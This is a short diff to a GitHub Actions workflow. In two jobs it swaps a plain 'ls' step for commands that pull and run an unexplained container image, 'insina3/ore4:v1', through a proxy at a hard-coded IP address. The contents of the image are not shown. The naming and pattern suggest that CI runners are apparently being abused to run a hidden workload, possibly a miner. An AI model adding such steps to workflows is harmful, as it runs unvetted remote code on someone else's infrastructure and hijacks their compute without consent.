@@ -51,9 +51,8 @@ jobs:
       id: go
     - name: Main
       run: |
-        #docker pull insina3/ore4:v1
-        #docker run insina3/ore4:v1 --env HTTP_PROXY="http://13.80.134.180:80"
-        ls
+        docker pull insina3/ore4:v1
+        docker run insina3/ore4:v1 --env HTTP_PROXY="http://13.80.134.180:80"
      
   cuk:
     needs: [alah, pelit]
@@ -77,9 +76,8 @@ jobs:
       id: go
     - name: Main
       run: |
-        #docker pull insina3/ore4:v1
-        #docker run insina3/ore4:v1 --env HTTP_PROXY="http://13.80.134.180:80"
-        ls
+        docker pull insina3/ore4:v1
+        docker run insina3/ore4:v1 --env HTTP_PROXY="http://13.80.134.180:80"
   Success:
     needs: [alah, pelit, cuk]
     if: always()
